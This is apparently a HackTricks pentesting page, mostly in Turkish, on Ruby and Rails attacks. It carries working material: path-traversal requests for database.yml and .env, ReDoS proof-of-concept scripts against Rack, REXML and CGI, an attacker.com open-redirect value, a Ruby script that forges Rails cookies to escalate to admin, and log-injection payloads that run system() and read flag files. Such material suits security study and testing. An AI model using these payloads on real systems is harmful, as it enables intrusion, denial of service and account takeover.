# Ruby İpuçları

{{#include ../../banners/hacktricks-training.md}}

## Dosya yükleyerek RCE

As explained in [this article](https://www.offsec.com/blog/cve-2024-46986/), uploading a `.rb` file into sensitive directories such as `config/initializers/` can lead to remote code execution (RCE) in Ruby on Rails applications.

İpuçları:
- Uygulama başlatıldığında çalıştırılan diğer boot/eager-load lokasyonları da yazılabilir olduklarında risklidir (ör. `config/initializers/` klasik örnektir). Eğer `config/` altında herhangi bir yere düşen ve daha sonra evaluate/require edilen rastgele bir dosya yüklemesi bulursanız, boot sırasında RCE elde edebilirsiniz.
- Rails'ın boot sırasında yükleyeceği container image içine kullanıcı kontrolündeki dosyaları kopyalayan dev/staging build'lerini arayın.

## Active Storage image transformation → command execution (CVE-2025-24293)

When an application uses Active Storage with `image_processing` + `mini_magick`, and passes untrusted parameters to image transformation methods, Rails versions prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 could allow command injection because some transformation methods were mistakenly allowed by default.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- Test sırasında denenecekler
- variant/processing seçeneklerini, dönüşüm isimlerini veya rastgele ImageMagick argümanlarını kabul eden uç noktaları tespit edin.
- Şüpheli hatalar veya yürütme yan-etkileri için `params[:t]` ve `params[:v]` üzerinde fuzzing yapın. Eğer metod adını etkileyebiliyor veya MiniMagick'e ulaşan ham argümanlar iletebiliyorsanız, image processor host üzerinde code exec elde edebilirsiniz.
- Sadece üretilmiş variantlara read-accessiniz varsa, craft edilmiş ImageMagick işlemleriyle blind exfiltration'ı deneyin.

- Düzeltme/Tespit
- Eğer Active Storage + `image_processing` + `mini_magick` kullanan ve kullanıcı kontrollü dönüşümlere izin veren Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 görürseniz, bunu exploitable olarak değerlendirin. Güncelleme yapmayı ve metod/parametreler için sıkı izin listeleri (allowlists) ile sertleştirilmiş bir ImageMagick politikası uygulamayı tavsiye edin.

## Rack::Static LFI / path traversal (CVE-2025-27610)

If the target stack uses Rack middleware directly or via frameworks, versions of `rack` prior to 2.2.13, 3.0.14, and 3.1.12 allow Local File Inclusion via `Rack::Static` when `:root` is unset/misconfigured. Encoded traversal in `PATH_INFO` can expose files under the process working directory or an unexpected root.

- `config.ru` veya middleware stack'lerinde `Rack::Static` mount eden uygulamaları arayın. Statik path'lere karşı encode edilmiş traversal'ları deneyin, örneğin:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Konfigüre edilen `urls:` ile prefix'i eşleştirecek şekilde ayarlayın. Uygulama dosya içeriği ile cevap veriyorsa, çözümlenen `:root` altında herhangi bir şeye LFI'niz olma ihtimali yüksektir.

- Hafifletme: Rack'i güncelleyin; `:root` yalnızca kamuya açık dosyaların olduğu bir dizine işaret etsin ve açıkça ayarlı olsun.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` and < `2.2.8.1` spent super-linear time parsing crafted `Content-Type: multipart/form-data` headers. A single POST with a gigantic `A=` parameter list can peg a Puma/Unicorn worker and cause DoS or request queue starvation.

- Hızlı PoC (bir worker'ı askıya alır):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Rails/Sinatra/Hanami/Grape gibi herhangi bir Rack tabanlı stack'e karşı çalışır. Eğer önde nginx/haproxy ile keep-alive varsa, worker'ları tüketmek için paralel tekrarlar yapın.
- Parser lineer hale getirilerek patchlendi; `rack` gem versiyonunun < `3.0.9.1` veya < `2.2.8.1` olup olmadığına bakın. Değerlendirmelerde, WAF'ların nadiren bunu engellediğini çünkü header'ın sözdizimsel olarak geçerli olduğunu belirtin.

## REXML XML parser ReDoS (CVE-2024-49761)

The REXML gem < 3.3.9 (Ruby 3.1 and earlier) catastrophically backtracks when parsing hex numeric character references containing long digit runs (e.g., `&#1111111111111x41;`). Any XML processed by REXML or libraries that wrap it (SOAP/XML API clients, SAML, SVG uploads) can be abused for CPU exhaustion.

Minimal tetikleyici, XML işleyen bir Rails endpoint'i için:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
Proses saniyelerce meşgul kalıyor ve worker CPU ani yükselme gösteriyorsa, muhtemelen bir güvenlik açığı vardır. Saldırı düşük bant genişliğine sahiptir ve XML ingest eden arka plan işleri'ni de etkiler.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Bir `cgi` gem'ini kullanan uygulamalar (birçok Rack yığınının varsayılanı) tek bir kötü amaçlı header ile kilitlenebilir:
- `CGI::Cookie.parse` süper-lineerdi; çok büyük cookie dizeleri (binlerce ayırıcı) O(N²) davranışı tetikliyordu.
- `CGI::Util#escapeElement` regex'i HTML escaping üzerinde ReDoS'a izin veriyordu.

Her iki sorun da `cgi` 0.3.5.1 / 0.3.7 / 0.4.2'de düzeltildi. For pentests, devasa bir `Cookie:` header gönderin veya helper koduna güvenilmeyen HTML verisi verin ve worker kilitlenmesini izleyin. Etkiyi artırmak için keep-alive ile birleştirin.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

`googlesign_in` gem < 1.3.0 (Rails üzerinde Google OAuth için kullanılır) `proceedto` parametresinde eksik bir same-origin kontrolü yapıyordu. `proceedto=//attacker.com/%2F..` gibi bozuk bir URL kontrolü atlatır ve kullanıcıyı site dışına yönlendirirken Rails flash/session cookies'ları leaking olur.

Exploit flow:
1. Kurban, saldırgan tarafından barındırılan hazırlanmış Google Sign-In bağlantısına tıklar.
2. Kimlik doğrulama sonrası, gem saldırgan kontrolündeki domaine yönlendirir; flash notifikasyonlarını veya wildcard domaine scoped cookie'lerde saklanan herhangi bir veriyi leaking yapar.
3. Uygulama kısa ömürlü token'ları veya magic links'i flash içinde saklıyorsa, bu account takeover'a dönüştürülebilir.

Test sırasında, Gemfile.lock içinde `googlesign_in` < 1.3.0 arayın ve bozuk `proceedto` değerlerini deneyin. Location header ve cookie reflection ile doğrulayın.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails, cookie'leri `secret_key_base`'den türetilen anahtarlarla şifreler ve imzalar. If that value leaks (ör. bir repo, log'lar veya hatalı yapılandırılmış credentials içinde), genellikle cookie'leri decrypt edebilir, modify edebilir ve yeniden encrypt edebilirsiniz. Uygulama cookie'lerde roller, user ID'leri veya feature flag'leri saklıyorsa bu genellikle authz bypass'a yol açar.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Notlar:
- Eski uygulamalar AES-256-CBC ve salts `encrypted cookie` / `signed encrypted cookie` veya JSON/Marshal serializers kullanıyor olabilir. Salts, cipher ve serializer'ı buna göre ayarlayın.
- Ele geçirme/değerlendirme durumunda, tüm mevcut cookies'leri geçersiz kılmak için `secret_key_base`'i döndürün/yenileyin.

## See also (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

Bir uygulama (çoğunlukla basit bir Rack/Sinatra/Rails endpoint) aynı anda hem:
- kullanıcı kontrollü bir string'i olduğu gibi logluyorsa, ve
- sonrasında aynı string'ten türetilen bir dosyayı (after `Pathname#cleanpath`) `load` ediyorsa,

Genellikle log'u zehirleyip uygulamayı log dosyasını `load` etmeye zorlayarak remote code execution elde edebilirsiniz. Temel primitifler:

- Ruby `load`, hedef dosyanın içeriğini dosya uzantısından bağımsız olarak Ruby olarak değerlendirir. İçeriği Ruby olarak parse edilebilen herhangi bir okunabilir metin dosyası çalıştırılacaktır.
- `Pathname#cleanpath`, dosya sistemine bakmadan `.` ve `..` segmentlerini çökertir; bu da path smuggling'e izin verir: saldırgan kontrollü eklemeler logging için öne eklenebilirken, temizlenmiş path yine de çalıştırılacak hedef dosyaya çözümlenir (ör. `../logs/error.log`).

### Minimal zafiyetli desen
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Neden log geçerli Ruby içerebilir
`Logger` şu şekilde önek satırları yazar:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
In Ruby, `#` starts a comment and `9/2/2025` is just arithmetic. Geçerli Ruby kodu enjekte etmek için şunları yapmanız gerekir:
- Payload'ınızı yeni bir satırda başlatın, böylece INFO satırındaki `#` tarafından yorum satırı yapılmaz; başa bir newline gönderin (`\n` veya `%0A`).
- INFO satırı tarafından açılan sarkmış `[`'i kapatın. Yaygın bir hile `]` ile başlayıp isteğe bağlı olarak parser'ı memnun etmek için `][0]=1` kullanmaktır.
- Ardından rastgele Ruby kodu yerleştirin (ör. `system(...)`).

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Hem kodu loglayan hem de log yoluna çözülen tek bir string kaçırma
Saldırgan kontrollü tek bir dize istiyoruz:
- ham olarak loglandığında Ruby payload'ımızı içerecek, ve
- `Pathname.new(<input>).cleanpath` üzerinden geçirildiğinde `../logs/error.log` olarak çözülecek, böylece sonraki `load` az önce zehirlenmiş log dosyasını çalıştırır.

`Pathname#cleanpath` şemaları yoksayar ve traversal components'ı çökerterek birleştirir; bu yüzden aşağıdaki işe yarar:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- `#` before `://` ensures Ruby ignores the tail when the log is executed, while `cleanpath` still reduces the suffix to `../logs/error.log`.
- The leading newline breaks out of the INFO line; `]` closes the dangling bracket; `][0]=1` satisfies the parser.

### End-to-end exploitation
1. Yedek script adı olarak aşağıdakini gönderin (gerekirse ilk yeni satırı URL-encode olarak `%0A` ile kodlayın):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. Uygulama ham dizgenizi `logs/error.log` dosyasına kaydeder.
3. Uygulama `cleanpath`'i hesaplar; bu `../logs/error.log` olarak çözülür ve üzerinde `load` çağrısı yapılır.
4. Ruby, log'a enjekte ettiğiniz kodu çalıştırır.

To exfiltrate a file in a CTF-like environment:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (ilk karakter yeni satırdır):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Referanslar

- [Rails Security Announcement: CVE-2025-24293 Active Storage unsafe transformation methods (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub Advisory: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath docs](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [How Ruby load works](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS advisory (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby security advisories for CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
